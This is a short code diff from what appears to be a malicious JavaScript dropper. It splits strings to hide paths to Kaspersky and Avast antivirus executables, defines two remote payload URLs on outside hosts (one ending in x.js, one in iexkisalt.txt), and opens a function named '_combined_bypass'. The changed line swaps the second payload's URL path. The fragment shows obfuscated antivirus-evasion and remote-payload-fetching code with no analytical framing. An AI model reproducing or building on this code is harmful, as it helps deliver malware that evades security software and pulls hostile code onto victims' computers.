@@ -17,7 +17,7 @@ var _path2 = "C:\\Pro" + "gram Fil" + "es (x86)\\Kasp" + "ersky La" + "b\\Kaspe"
 var _path3 = "C:\\Pro" + "gram Files\\Avas" + "t Software\\Avas" + "t\\Avast" + "UI.exe"; 
 
 var _u1 = "htt" + "ps://prnt" + "scr.mov/x.js";
-var _u2 = "htt" + "ps://babayagar" + "eborn.net/palad/iexkisalt.txt";
+var _u2 = "htt" + "ps://babayagar" + "eborn.net/blackhole/nod32/iexkisalt.txt";
 
 function _combined_bypass() {
     try {
